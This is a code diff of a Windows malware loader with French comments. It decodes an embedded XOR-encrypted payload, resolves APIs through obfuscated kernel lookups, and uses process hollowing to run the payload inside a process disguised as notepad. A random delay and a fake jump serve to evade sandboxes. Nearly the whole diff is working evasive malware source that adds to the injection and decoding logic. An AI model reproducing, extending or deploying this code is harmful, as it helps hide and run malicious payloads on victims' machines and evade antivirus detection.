@@ -1,9 +1,11 @@
 #include <windows.h>
 #include "payload.h"
 
+int extern conv7to8(unsigned char *indata, unsigned char *outdata, int lenarray) asm ("_conv7to8") ; 
 int extern startrand() asm ("_startrand") ; // (unsigned char *);
 int extern findkernel() asm ("_findkernel") ; // (unsigned char *);
 int extern getfunction( int kernel, unsigned char *library, int lenlib ) asm ("_getfunction");
+
 
 // Redeclaration des type des fonctions offusquee 
 //http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Section/NtUnmapViewOfSection.html
@@ -102,18 +104,19 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
   xReadProcessMemory = (PReadProcessMemory) getfunction(findkernel(),(unsigned char *)vReadProcessMemory,strlen(vReadProcessMemory));
 //	xReadProcessMemory = PReadProcessMemory(xGetProcAddress(Hkernel32,vReadProcessMemory));
 	xWriteProcessMemory = (PWriteProcessMemory)  getfunction(findkernel(),(unsigned char *)vWriteProcessMemory,strlen(vWriteProcessMemory));
+ xCreateProcessA = PCreateProcessA(xGetProcAddress(Hkernel32,vCreateProcessA));
 //	xWriteProcessMemory = PWriteProcessMemory(xGetProcAddress(Hkernel32,vWriteProcessMemory));
-	
+xNtResumeThread = PNtResumeThread(xGetProcAddress(Hntdll,vNtResumeThread));	
 	xGetThreadContext = ( PGetThreadContext) getfunction(findkernel(),(unsigned char *)vGetThreadContext,strlen(vGetThreadContext));
 //	xGetThreadContext = PGetThreadContext(xGetProcAddress(Hkernel32,vGetThreadContext));
 	xSetThreadContext = ( PSetThreadContext) getfunction(findkernel(),(unsigned char *)vSetThreadContext,strlen(vSetThreadContext));
 //	xSetThreadContext = PSetThreadContext(xGetProcAddress(Hkernel32,vSetThreadContext));
-	xNtUnmapViewOfSection = PNtUnmapViewOfSection(xGetProcAddress(Hntdll,vNtUnmapViewOfSection));
+	xNtUnmapViewOfSection = (PNtUnmapViewOfSection)(xGetProcAddress(Hntdll,vNtUnmapViewOfSection));
 
 	IDH = PIMAGE_DOS_HEADER(pFile);
-	if (IDH->e_magic == IMAGE_DOS_SIGNATURE) {
+	if (IDH->e_magic == IMAGE_DOS_SIGNATURE) { // TEST MZ
 		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
-		if (INH->Signature == IMAGE_NT_SIGNATURE) {
+		if (INH->Signature == IMAGE_NT_SIGNATURE) {   // TESTPE
 			RtlZeroMemory(&SI, sizeof(SI));
 			RtlZeroMemory(&PI, sizeof(PI));
 
@@ -148,6 +151,7 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
 		}
 	}
 	}
+//	GetLastError();
 	VirtualFree(pFile, 0, MEM_RELEASE);
 }
 
@@ -164,18 +168,27 @@ int dexor(unsigned char * lpayload,int lpayloadlen,unsigned char * lkey ) {
 }
 
 // Main program
+
+unsigned char* buffer;
+int payloadlen7;
+
 int main()
-
 {
-
+buffer = (unsigned char*) malloc (payloadlen);
+payloadlen7=conv7to8( payload,buffer,payloadlen);
 int dummy = vaauxfraises(41414141);
 
+
+
+memcpy(payload,buffer,payloadlen7);
 // Ce exe sera notepad
 char fakeexe[]="ri-H:?5@HD-?@E6A25]6I6";
 rot47(fakeexe);
+
+
 // Random delay et faux jump
 if (startrand()==1) {
-  dexor(payload,payloadlen,key);
+  dexor(payload,payloadlen7,key);
   ExecFile(LPSTR(fakeexe),payload);
 }
 
